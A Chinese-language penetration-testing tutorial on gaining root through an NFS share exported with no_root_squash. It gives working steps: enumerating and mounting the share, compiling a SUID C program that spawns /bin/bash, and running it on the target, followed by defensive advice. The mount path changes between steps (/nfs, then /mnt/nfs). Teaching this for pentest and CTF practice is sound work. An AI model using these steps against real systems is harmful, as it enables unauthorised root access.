# 🛠 Linux 權限提升技巧：透過 NFS（Network File System）錯誤配置提權

## 📘 基本概念

- **NFS** 是 Linux/Unix 系統的網路檔案共享協定，設定檔通常位於 `/etc/exports`。
- 預設情況下，NFS 會使用 **root squashing**：把 root 使用者映射為無特權的 `nfsnobody`，防止 root 權限濫用。
- 若共享目錄啟用了 `no_root_squash` 選項，連接的 root 使用者不會被降權，擁有該共享的完全 root 權限。
- **攻擊重點在於：**
  - 利用 `no_root_squash` 可直接建立 SUID 程式並保留 root 權限。
  - 利用 NFS 將惡意可執行檔寫入共享目錄，並從目標系統執行以提權。
  - 權限繞過是建立於 root 身份未被「降級」的前提下。
  - 若目標系統自動掛載該 NFS 共享，攻擊者甚至無需登入目標系統即可植入後門。


---

## 🎯 攻擊條件

1. 目標系統的 NFS 共享允許讀取 `/etc/exports`，確認是否有 `no_root_squash` 的共享。
2. 攻擊者可在這個共享上**寫入檔案**。
3. 在該共享目錄建立一個設定了 **SUID 位元** 的可執行檔案（例如用 C 編譯的反彈 shell 或 bash）。
4. 在目標系統上執行此檔案，因為 `no_root_squash`，該程序以 root 權限執行，達成提權。

---

## 攻擊步驟

### 1. 檢查關鍵檔案

- 查看可掛載的 NFS 共享（在目標機器上）
  
  ```bash
  cat /etc/exports
  ```

- 查看可掛載的 NFS 共享（在攻擊機器上）
  
  ```bash
  showmount -e TARGET_IP
  ```


### 2. 掛載 NFS 共享
- 掛載含 no_root_squash 的共享
  ```bash
  mkdir -p /nfs
  mount TARGET_IP:/exported/path /nfs
  ```

### 3. 建立提權用 SUID 執行檔
- 進入共享目錄後創建 C 程式（在攻擊機器上）
  ```bash
  cd /mnt/nfs
  nano nfs.c
  ```

- C 程式 (nfs.c)，內容類似：
  ```bash
  #include <unistd.h>
  int main() {
     setuid(0);
     setgid(0);
     system("/bin/bash");
     return 0;
  }
  ```
### 4. 建編譯 nfs.c 並設定 SUID 權限
  ```bash
  gcc nfs.c -o nfs
  chmod +s nfs
  ```

### 5. 在目標祭器上執行 nfs
  ```bash
  ./nfs
  ```

## 🧰 重點說明
- no_root_squash 是 NFS 的風險點，解除 root 權限降格。
- 可寫入含 no_root_squash 共享的使用者可透過放置 SUID 程式提升權限。
- 一旦成功執行該程式，即可取得 root shell。

## 🛡 防禦建議
- 避免使用 no_root_squash 除非絕對必要。
- 嚴格設定 NFS 共享權限與存取控制。
- 定期檢查 /etc/exports 配置與共享目錄內容。
- 監控可疑 SUID 程式產生與執行。

## 📌 小結
- NFS 錯誤配置是 Linux 權限提升的常見向量之一。
- 利用 no_root_squash 權限寫入共享並執行 SUID 程式，可快速獲得 root 權限。
- 是滲透測試與 CTF 常見考題，切勿忽視此類配置漏洞。